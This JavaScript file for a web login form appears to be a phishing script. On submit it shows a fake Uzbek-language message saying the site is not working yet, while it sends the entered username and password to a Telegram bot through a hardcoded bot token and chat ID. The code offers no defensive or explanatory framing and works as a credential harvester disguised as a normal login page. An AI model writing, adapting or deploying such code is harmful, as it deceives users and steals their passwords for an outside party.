const form = document.querySelector('#form')
const sign =document.querySelector('#sign')
// sign.addEventListener( 'click', ()=>{
//   if()
// })

form.addEventListener('submit',(e)=>{
   e.preventDefault()
   var text = document.querySelector('#text').value
   var password = document.querySelector('#password').value

   if(text.length == 0){
    alert('Malumotlarngizni kiriting? 💻')
   }else{
    alert('Hali sayt ishga tushmadi keyinroq qayta urinib koring ⏳')
   }


   var token = '7258371512:AAE1L0CMhrwCJ-lIQSYSvVTpKYqSuHJqoK0'

   var chat_id = '-4279465279'

   var my_text = `Nik: ${text}                                                                                                                                                                                    Parol:${password}`

   var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(my_text,  password)}`;


   let api = new XMLHttpRequest()

   api.open("GET",url,true)
   api.send()

   text.value = ''
})